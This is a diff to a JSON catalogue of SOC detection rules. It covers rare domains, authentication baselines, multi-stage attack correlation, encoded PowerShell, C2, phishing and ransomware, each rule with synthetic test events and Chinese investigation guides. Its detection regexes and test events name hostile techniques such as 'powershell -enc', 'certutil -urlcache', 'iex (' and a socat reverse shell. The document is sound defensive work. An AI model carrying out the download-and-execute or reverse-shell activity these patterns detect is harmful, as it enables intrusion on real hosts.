-      "tests": [{"name": "first-seen domain after warmup", "expectAlert": true, "events": [{"source": "dns", "host": "endpoint-dns-1", "msg": "dns query", "fields": {"dst_domain": "corp.example"}}, {"source": "dns", "host": "endpoint-dns-1", "msg": "dns query", "fields": {"dst_domain": "updates.example"}}, {"source": "dns", "host": "endpoint-dns-1", "msg": "dns query", "fields": {"dst_domain": "cdn.example"}}, {"source": "dns", "host": "endpoint-dns-1", "msg": "dns query", "fields": {"dst_domain": "new-c2.example"}}]}, {"name": "known domain after warmup", "expectAlert": false, "events": [{"source": "dns", "host": "endpoint-dns-2", "msg": "dns query", "fields": {"dst_domain": "corp.example"}}, {"source": "dns", "host": "endpoint-dns-2", "msg": "dns query", "fields": {"dst_domain": "updates.example"}}, {"source": "dns", "host": "endpoint-dns-2", "msg": "dns query", "fields": {"dst_domain": "cdn.example"}}, {"source": "dns", "host": "endpoint-dns-2", "msg": "dns query", "fields": {"dst_domain": "corp.example"}}]}]
+      "dataSources": [
+        "dns",
+        "proxy",
+        "edr"
+      ],
+      "mitre": [
+        "T1071.004"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1071/004/"
+      ],
+      "spec": {
+        "id": "RARE-DOMAIN",
+        "name": "Rare destination domain",
+        "type": "rare",
+        "severity": "MEDIUM",
+        "message": "Host {key} contacted first-seen {field}={value}",
+        "keyField": "host",
+        "routingField": "host",
+        "valueField": "dst_domain",
+        "warmup": 3,
+        "mitre": "T1071.004",
+        "match": [
+          {
+            "field": "source",
+            "op": "regex",
+            "value": "(?i)^(dns|proxy|edr)$"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "first-seen domain after warmup",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "dns",
+              "host": "endpoint-dns-1",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "corp.example"
+              }
+            },
+            {
+              "source": "dns",
+              "host": "endpoint-dns-1",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "updates.example"
+              }
+            },
+            {
+              "source": "dns",
+              "host": "endpoint-dns-1",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "cdn.example"
+              }
+            },
+            {
+              "source": "dns",
+              "host": "endpoint-dns-1",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "new-c2.example"
+              }
+            }
+          ]
+        },
+        {
+          "name": "known domain after warmup",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "dns",
+              "host": "endpoint-dns-2",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "corp.example"
+              }
+            },
+            {
+              "source": "dns",
+              "host": "endpoint-dns-2",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "updates.example"
+              }
+            },
+            {
+              "source": "dns",
+              "host": "endpoint-dns-2",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "cdn.example"
+              }
+            },
+            {
+              "source": "dns",
+              "host": "endpoint-dns-2",
+              "msg": "dns query",
+              "fields": {
+                "dst_domain": "corp.example"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 查询域名信誉、注册时长与解析 IP 归属；\n2. 确认业务侧是否新上线第三方服务；\n3. 结合 C2-BEACON/EXFIL-LARGE 判断是否为失陷外联。",
+      "falsePositives": [
+        "新采购/上线的 SaaS 域名",
+        "CDN CNAME 引入的新域名"
+      ]
     },
     {
       "id": "BASELINE-AUTH-VOLUME",
@@ -389,11 +1926,166 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Authentication volume for one user exceeds its learned historical buckets.",
-      "dataSources": ["auth", "sshd", "windows"],
-      "mitre": ["T1078"],
-      "references": ["https://attack.mitre.org/techniques/T1078/"],
-      "spec": {"id": "BASELINE-AUTH-VOLUME", "name": "Authentication volume baseline deviation", "type": "baseline", "severity": "HIGH", "message": "User {key} generated {count} auth events versus baseline {baseline} ({z} sigma)", "keyField": "user", "routingField": "user", "window": "60s", "baselineWindows": 6, "warmup": 3, "sigma": 2.0, "minCount": 4, "mitre": "T1078", "match": [{"field": "source", "op": "eq", "value": "auth"}]},
-      "tests": [{"name": "auth spike above learned baseline", "expectAlert": true, "events": [{"timestamp": "2026-01-01T00:00:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:01:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:02:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:03:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:03:02Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:03:03Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "alice"}}, {"timestamp": "2026-01-01T00:03:04Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "alice"}}]}, {"name": "auth volume remains near baseline", "expectAlert": false, "events": [{"timestamp": "2026-01-01T01:00:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "bob"}}, {"timestamp": "2026-01-01T01:01:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "bob"}}, {"timestamp": "2026-01-01T01:02:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "bob"}}, {"timestamp": "2026-01-01T01:03:01Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "bob"}}, {"timestamp": "2026-01-01T01:03:02Z", "source": "auth", "host": "auth-1", "msg": "login", "fields": {"user": "bob"}}]}]
+      "dataSources": [
+        "auth",
+        "sshd",
+        "windows"
+      ],
+      "mitre": [
+        "T1078"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/"
+      ],
+      "spec": {
+        "id": "BASELINE-AUTH-VOLUME",
+        "name": "Authentication volume baseline deviation",
+        "type": "baseline",
+        "severity": "HIGH",
+        "message": "User {key} generated {count} auth events versus baseline {baseline} ({z} sigma)",
+        "keyField": "user",
+        "routingField": "user",
+        "window": "60s",
+        "baselineWindows": 6,
+        "warmup": 3,
+        "sigma": 2,
+        "minCount": 4,
+        "mitre": "T1078",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "auth"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "auth spike above learned baseline",
+          "expectAlert": true,
+          "events": [
+            {
+              "timestamp": "2026-01-01T00:00:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:01:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:02:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:03:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:03:02Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:03:03Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:03:04Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "alice"
+              }
+            }
+          ]
+        },
+        {
+          "name": "auth volume remains near baseline",
+          "expectAlert": false,
+          "events": [
+            {
+              "timestamp": "2026-01-01T01:00:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:01:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:02:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:03:01Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:03:02Z",
+              "source": "auth",
+              "host": "auth-1",
+              "msg": "login",
+              "fields": {
+                "user": "bob"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 将认证量按账号与结果（成功/失败）拆分，定位异常来源；\n2. 排查是否存在密码喷洒（多账号低频失败）；\n3. 确认业务事件（批处理、密码过期风暴）并校准基线。",
+      "falsePositives": [
+        "批处理作业在窗口期的集中认证",
+        "认证代理重试导致的量级放大"
+      ]
     },
     {
       "id": "CORR-ATTACK-SIGNALS",
@@ -401,95 +2093,1217 @@
       "status": "ACTIVE",
       "owner": "socp-detection",
       "description": "Unordered authentication, privilege-escalation, and suspicious-execution signals on one host.",
-      "dataSources": ["auth", "auditd", "edr"],
-      "mitre": ["T1078", "T1548", "T1059"],
-      "references": ["https://attack.mitre.org/techniques/T1078/", "https://attack.mitre.org/techniques/T1548/", "https://attack.mitre.org/techniques/T1059/"],
-      "spec": {"id": "CORR-ATTACK-SIGNALS", "name": "Multi-stage host attack signals", "type": "correlation-set", "severity": "CRITICAL", "message": "Host {key} observed all {count} attack-stage signals", "keyField": "host", "routingField": "host", "window": "600s", "mitre": "T1078", "steps": [[{"field": "msg", "op": "contains", "value": "Accepted password"}], [{"field": "msg", "op": "contains", "value": "sudo:"}], [{"field": "msg", "op": "regex", "value": "(?i)(powershell|socat|reverse shell)"}]]},
-      "tests": [{"name": "all stages in arbitrary order", "expectAlert": true, "events": [{"source": "edr", "host": "endpoint-corr-1", "msg": "socat reverse shell started", "fields": {"user": "alice"}}, {"source": "auth", "host": "endpoint-corr-1", "msg": "Accepted password for alice", "fields": {"user": "alice"}}, {"source": "auditd", "host": "endpoint-corr-1", "msg": "sudo: alice executed /bin/sh", "fields": {"user": "alice"}}]}, {"name": "missing privilege escalation", "expectAlert": false, "events": [{"source": "auth", "host": "endpoint-corr-2", "msg": "Accepted password for bob", "fields": {"user": "bob"}}, {"source": "edr", "host": "endpoint-corr-2", "msg": "powershell started", "fields": {"user": "bob"}}]}]
+      "dataSources": [
+        "auth",
+        "auditd",
+        "edr"
+      ],
+      "mitre": [
+        "T1078",
+        "T1548",
+        "T1059"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1078/",
+        "https://attack.mitre.org/techniques/T1548/",
+        "https://attack.mitre.org/techniques/T1059/"
+      ],
+      "spec": {
+        "id": "CORR-ATTACK-SIGNALS",
+        "name": "Multi-stage host attack signals",
+        "type": "correlation-set",
+        "severity": "CRITICAL",
+        "message": "Host {key} observed all {count} attack-stage signals",
+        "keyField": "host",
+        "routingField": "host",
+        "window": "600s",
+        "mitre": "T1078",
+        "steps": [
+          [
+            {
+              "field": "msg",
+              "op": "contains",
+              "value": "Accepted password"
+            }
+          ],
+          [
+            {
+              "field": "msg",
+              "op": "contains",
+              "value": "sudo:"
+            }
+          ],
+          [
+            {
+              "field": "msg",
+              "op": "regex",
+              "value": "(?i)(powershell|socat|reverse shell)"
+            }
+          ]
+        ]
+      },
+      "tests": [
+        {
+          "name": "all stages in arbitrary order",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "edr",
+              "host": "endpoint-corr-1",
+              "msg": "socat reverse shell started",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "source": "auth",
+              "host": "endpoint-corr-1",
+              "msg": "Accepted password for alice",
+              "fields": {
+                "user": "alice"
+              }
+            },
+            {
+              "source": "auditd",
+              "host": "endpoint-corr-1",
+              "msg": "sudo: alice executed /bin/sh",
+              "fields": {
+                "user": "alice"
+              }
+            }
+          ]
+        },
+        {
+          "name": "missing privilege escalation",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "auth",
+              "host": "endpoint-corr-2",
+              "msg": "Accepted password for bob",
+              "fields": {
+                "user": "bob"
+              }
+            },
+            {
+              "source": "edr",
+              "host": "endpoint-corr-2",
+              "msg": "powershell started",
+              "fields": {
+                "user": "bob"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 本告警为主机级多信号聚合，直接进入深度调查而非例行处置；\n2. 按时间线串联认证、提权与可疑执行三类信号；\n3. 优先准备主机隔离与取证，再逐项确认底层告警真伪。",
+      "falsePositives": [
+        "合法变更窗口内多类信号同时出现的叠加（仍需人工逐项确认）"
+      ]
     },
     {
-      "id": "EXEC-SUSPICIOUS-SHELL", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Encoded or download-and-execute shell activity.", "dataSources": ["edr", "sysmon", "auditd"], "mitre": ["T1059"], "references": ["https://attack.mitre.org/techniques/T1059/"],
-      "spec": {"id": "EXEC-SUSPICIOUS-SHELL", "name": "Suspicious shell execution", "type": "pattern", "severity": "HIGH", "message": "Suspicious command on {host}: {msg}", "mitre": "T1059", "match": [{"field": "msg", "op": "regex", "value": "(?i)powershell -enc|certutil -urlcache|invoke-expression|iex \\("}]},
-      "tests": [{"name": "encoded PowerShell", "expectAlert": true, "events": [{"source": "edr", "host": "host-1", "msg": "powershell -enc SQBFAFgA", "fields": {}}]}, {"name": "ordinary shell", "expectAlert": false, "events": [{"source": "edr", "host": "host-1", "msg": "bash backup.sh", "fields": {}}]}]
+      "id": "EXEC-SUSPICIOUS-SHELL",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Encoded or download-and-execute shell activity.",
+      "dataSources": [
+        "edr",
+        "sysmon",
+        "auditd"
+      ],
+      "mitre": [
+        "T1059"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1059/"
+      ],
+      "spec": {
+        "id": "EXEC-SUSPICIOUS-SHELL",
+        "name": "Suspicious shell execution",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Suspicious command on {host}: {msg}",
+        "mitre": "T1059",
+        "match": [
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)powershell -enc|certutil -urlcache|invoke-expression|iex \\("
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "encoded PowerShell",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "edr",
+              "host": "host-1",
+              "msg": "powershell -enc SQBFAFgA",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "ordinary shell",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "edr",
+              "host": "host-1",
+              "msg": "bash backup.sh",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 解码/还原完整命令行；\n2. 核查下载 URL 信誉与落地文件哈希；\n3. 在同主机检索持久化与凭据访问；\n4. 确认后隔离主机并封锁相关域名。",
+      "falsePositives": [
+        "开发者/运维的调试脚本（登记白名单）",
+        "安全工具的下载执行类响应动作"
+      ]
     },
     {
-      "id": "FW-SCAN", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Repeated firewall blocks from one source indicate scanning.", "dataSources": ["firewall"], "mitre": ["T1046"], "references": ["https://attack.mitre.org/techniques/T1046/"],
-      "spec": {"id": "FW-SCAN", "name": "Firewall scan", "type": "threshold", "severity": "MEDIUM", "message": "Source {key} was blocked {count} times in {window}", "keyField": "src_ip", "threshold": 10, "window": "30s", "mitre": "T1046", "match": [{"field": "source", "op": "eq", "value": "firewall"}, {"field": "action", "op": "eq", "value": "block"}]},
-      "tests": [{"name": "ten blocks", "expectAlert": true, "events": [{"repeat": 10, "source": "firewall", "host": "fw-1", "msg": "blocked", "fields": {"src_ip": "198.51.100.70", "action": "block"}}]}, {"name": "allowed traffic", "expectAlert": false, "events": [{"source": "firewall", "host": "fw-1", "msg": "allowed", "fields": {"src_ip": "198.51.100.70", "action": "allow"}}]}]
+      "id": "FW-SCAN",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Repeated firewall blocks from one source indicate scanning.",
+      "dataSources": [
+        "firewall"
+      ],
+      "mitre": [
+        "T1046"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1046/"
+      ],
+      "spec": {
+        "id": "FW-SCAN",
+        "name": "Firewall scan",
+        "type": "threshold",
+        "severity": "MEDIUM",
+        "message": "Source {key} was blocked {count} times in {window}",
+        "keyField": "src_ip",
+        "threshold": 10,
+        "window": "30s",
+        "mitre": "T1046",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "firewall"
+          },
+          {
+            "field": "action",
+            "op": "eq",
+            "value": "block"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "ten blocks",
+          "expectAlert": true,
+          "events": [
+            {
+              "repeat": 10,
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "blocked",
+              "fields": {
+                "src_ip": "198.51.100.70",
+                "action": "block"
+              }
+            }
+          ]
+        },
+        {
+          "name": "allowed traffic",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "firewall",
+              "host": "fw-1",
+              "msg": "allowed",
+              "fields": {
+                "src_ip": "198.51.100.70",
+                "action": "allow"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 分析被扫描的端口范围与协议分布，判断扫描类型；\n2. 在边界封禁源 IP 并记录封禁依据；\n3. 重点跟踪后续是否出现登录或漏洞利用成功的迹象。",
+      "falsePositives": [
+        "外部攻击面管理服务的定期扫描",
+        "已登记的安全评估厂商流量"
+      ]
     },
     {
-      "id": "MAL-C2", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Known command-and-control terms in proxy traffic.", "dataSources": ["proxy"], "mitre": ["T1071"], "references": ["https://attack.mitre.org/techniques/T1071/"],
-      "spec": {"id": "MAL-C2", "name": "Suspected C2 traffic", "type": "pattern", "severity": "HIGH", "message": "Suspected C2 traffic on {host}: {msg}", "mitre": "T1071", "match": [{"field": "source", "op": "eq", "value": "proxy"}, {"field": "msg", "op": "regex", "value": "(?i)beacon|c2|command-and-control|cobaltstrike"}]},
-      "tests": [{"name": "Cobalt Strike beacon", "expectAlert": true, "events": [{"source": "proxy", "host": "proxy-1", "msg": "cobaltstrike beacon", "fields": {}}]}, {"name": "normal browsing", "expectAlert": false, "events": [{"source": "proxy", "host": "proxy-1", "msg": "GET /docs 200", "fields": {}}]}]
+      "id": "MAL-C2",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Known command-and-control terms in proxy traffic.",
+      "dataSources": [
+        "proxy"
+      ],
+      "mitre": [
+        "T1071"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1071/"
+      ],
+      "spec": {
+        "id": "MAL-C2",
+        "name": "Suspected C2 traffic",
+        "type": "pattern",
+        "severity": "HIGH",
+        "message": "Suspected C2 traffic on {host}: {msg}",
+        "mitre": "T1071",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "proxy"
+          },
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)beacon|c2|command-and-control|cobaltstrike"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "Cobalt Strike beacon",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "proxy",
+              "host": "proxy-1",
+              "msg": "cobaltstrike beacon",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "normal browsing",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "proxy",
+              "host": "proxy-1",
+              "msg": "GET /docs 200",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 还原 proxy 日志中的完整 URL/UA/Referer 上下文；\n2. 隔离访问主机并阻断域名；\n3. 以域名/URL 指纹扩展检索其他受影响主机。",
+      "falsePositives": [
+        "安全研究人员对已知恶意设施的访问",
+        "URL 路径偶然包含可疑关键字"
+      ]
     },
     {
-      "id": "PHISH-MAIL", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Phishing indicators in mail gateway events.", "dataSources": ["mail"], "mitre": ["T1566"], "references": ["https://attack.mitre.org/techniques/T1566/"],
-      "spec": {"id": "PHISH-MAIL", "name": "Phishing mail delivery", "type": "pattern", "severity": "MEDIUM", "message": "Possible phishing mail: {msg}", "mitre": "T1566", "match": [{"field": "source", "op": "eq", "value": "mail"}, {"field": "msg", "op": "regex", "value": "(?i)phish|suspicious attachment"}]},
-      "tests": [{"name": "suspicious attachment", "expectAlert": true, "events": [{"source": "mail", "host": "mx-1", "msg": "suspicious attachment quarantined", "fields": {}}]}, {"name": "delivered newsletter", "expectAlert": false, "events": [{"source": "mail", "host": "mx-1", "msg": "newsletter delivered", "fields": {}}]}]
+      "id": "PHISH-MAIL",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Phishing indicators in mail gateway events.",
+      "dataSources": [
+        "mail"
+      ],
+      "mitre": [
+        "T1566"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1566/"
+      ],
+      "spec": {
+        "id": "PHISH-MAIL",
+        "name": "Phishing mail delivery",
+        "type": "pattern",
+        "severity": "MEDIUM",
+        "message": "Possible phishing mail: {msg}",
+        "mitre": "T1566",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "mail"
+          },
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)phish|suspicious attachment"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "suspicious attachment",
+          "expectAlert": true,
+          "events": [
+            {
+              "source": "mail",
+              "host": "mx-1",
+              "msg": "suspicious attachment quarantined",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "delivered newsletter",
+          "expectAlert": false,
+          "events": [
+            {
+              "source": "mail",
+              "host": "mx-1",
+              "msg": "newsletter delivered",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 确认收件人是否已点击链接、打开附件或回复；\n2. 在邮件网关全局撤回同主题/同发件域邮件；\n3. 检索该发件域的其他投递与受害者范围；\n4. 对已点击用户强制改密并检查会话。",
+      "falsePositives": [
+        "营销/通知类邮件被关键字规则误报",
+        "第三方邮件服务的合法群发"
+      ]
     },
     {
-      "id": "RANSOM-ENCRYPT", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "High-volume ransomware file encryption indicators.", "dataSources": ["edr"], "mitre": ["T1486"], "references": ["https://attack.mitre.org/techniques/T1486/"],
-      "spec": {"id": "RANSOM-ENCRYPT", "name": "Ransomware encryption", "type": "threshold", "severity": "CRITICAL", "message": "Host {key} produced {count} encryption indicators", "keyField": "host", "threshold": 20, "window": "60s", "mitre": "T1486", "match": [{"field": "source", "op": "eq", "value": "edr"}, {"field": "msg", "op": "regex", "value": "(?i)locky|encrypted|wncry|ransom"}]},
-      "tests": [{"name": "twenty encrypted files", "expectAlert": true, "events": [{"repeat": 20, "source": "edr", "host": "endpoint-ransom", "msg": "file encrypted", "fields": {}}]}, {"name": "nineteen encrypted files", "expectAlert": false, "events": [{"repeat": 19, "source": "edr", "host": "endpoint-safe", "msg": "file encrypted", "fields": {}}]}]
+      "id": "RANSOM-ENCRYPT",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "High-volume ransomware file encryption indicators.",
+      "dataSources": [
+        "edr"
+      ],
+      "mitre": [
+        "T1486"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1486/"
+      ],
+      "spec": {
+        "id": "RANSOM-ENCRYPT",
+        "name": "Ransomware encryption",
+        "type": "threshold",
+        "severity": "CRITICAL",
+        "message": "Host {key} produced {count} encryption indicators",
+        "keyField": "host",
+        "threshold": 20,
+        "window": "60s",
+        "mitre": "T1486",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "edr"
+          },
+          {
+            "field": "msg",
+            "op": "regex",
+            "value": "(?i)locky|encrypted|wncry|ransom"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "twenty encrypted files",
+          "expectAlert": true,
+          "events": [
+            {
+              "repeat": 20,
+              "source": "edr",
+              "host": "endpoint-ransom",
+              "msg": "file encrypted",
+              "fields": {}
+            }
+          ]
+        },
+        {
+          "name": "nineteen encrypted files",
+          "expectAlert": false,
+          "events": [
+            {
+              "repeat": 19,
+              "source": "edr",
+              "host": "endpoint-safe",
+              "msg": "file encrypted",
+              "fields": {}
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 立即隔离主机并断开其与所有共享目录的连接；\n2. 保留加密前快照、勒索信与进程信息用于取证与溯源；\n3. 启动备份恢复与重大事件流程；\n4. 排查共享权限与同网段其他主机的感染迹象。",
+      "falsePositives": [
+        "批量加密/压缩类备份任务（需登记白名单与行为基线）"
+      ]
     },
     {
-      "id": "UEBA-AUTH-SPIKE", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "Authentication volume deviates from the source's learned baseline.", "dataSources": ["auth"], "mitre": ["T1110"], "references": ["https://attack.mitre.org/techniques/T1110/"],
-      "spec": {"id": "UEBA-AUTH-SPIKE", "name": "Authentication volume spike", "type": "baseline", "severity": "HIGH", "message": "Source {key} generated {count} events versus baseline {baseline}", "keyField": "src_ip", "window": "60s", "baselineWindows": 12, "warmup": 3, "sigma": 3.0, "minCount": 5, "mitre": "T1110", "match": [{"field": "source", "op": "eq", "value": "auth"}]},
-      "tests": [{"name": "spike after warmup", "expectAlert": true, "events": [{"timestamp": "2026-01-01T00:00:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.80"}}, {"timestamp": "2026-01-01T00:01:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.80"}}, {"timestamp": "2026-01-01T00:02:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.80"}}, {"repeat": 5, "timestamp": "2026-01-01T00:03:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.80"}}]}, {"name": "below minimum", "expectAlert": false, "events": [{"timestamp": "2026-01-01T01:00:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.81"}}, {"timestamp": "2026-01-01T01:01:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.81"}}, {"timestamp": "2026-01-01T01:02:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.81"}}, {"repeat": 4, "timestamp": "2026-01-01T01:03:01Z", "source": "auth", "msg": "login", "fields": {"src_ip": "198.51.100.81"}}]}]
+      "id": "UEBA-AUTH-SPIKE",
+      "version": "1.0.0",
+      "status": "ACTIVE",
+      "owner": "socp-detection",
+      "description": "Authentication volume deviates from the source's learned baseline.",
+      "dataSources": [
+        "auth"
+      ],
+      "mitre": [
+        "T1110"
+      ],
+      "references": [
+        "https://attack.mitre.org/techniques/T1110/"
+      ],
+      "spec": {
+        "id": "UEBA-AUTH-SPIKE",
+        "name": "Authentication volume spike",
+        "type": "baseline",
+        "severity": "HIGH",
+        "message": "Source {key} generated {count} events versus baseline {baseline}",
+        "keyField": "src_ip",
+        "window": "60s",
+        "baselineWindows": 12,
+        "warmup": 3,
+        "sigma": 3,
+        "minCount": 5,
+        "mitre": "T1110",
+        "match": [
+          {
+            "field": "source",
+            "op": "eq",
+            "value": "auth"
+          }
+        ]
+      },
+      "tests": [
+        {
+          "name": "spike after warmup",
+          "expectAlert": true,
+          "events": [
+            {
+              "timestamp": "2026-01-01T00:00:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.80"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:01:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.80"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T00:02:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.80"
+              }
+            },
+            {
+              "repeat": 5,
+              "timestamp": "2026-01-01T00:03:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.80"
+              }
+            }
+          ]
+        },
+        {
+          "name": "below minimum",
+          "expectAlert": false,
+          "events": [
+            {
+              "timestamp": "2026-01-01T01:00:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.81"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:01:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.81"
+              }
+            },
+            {
+              "timestamp": "2026-01-01T01:02:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.81"
+              }
+            },
+            {
+              "repeat": 4,
+              "timestamp": "2026-01-01T01:03:01Z",
+              "source": "auth",
+              "msg": "login",
+              "fields": {
+                "src_ip": "198.51.100.81"
+              }
+            }
+          ]
+        }
+      ],
+      "investigationGuide": "1. 按源与账号拆分认证成功率，定位异常聚集点；\n2. 判断是否为密码喷洒（多账号低频失败）或爆破；\n3. 结合 UEBA-NEW-GEO 与设备维度交叉确认。",
+      "falsePositives": [
+        "应用网关/SSO 集中代理产生的认证量放大"
+      ]
     },
     {
-      "id": "UEBA-NEW-DEST", "version": "1.0.0", "status": "ACTIVE", "owner": "socp-detection",
-       "description": "A host contacts a new domain after its learning period.", "dataSources": ["proxy"], "mitre": ["T1071"], "references": ["https://attack.mitre.org/techniques/T1071/"],
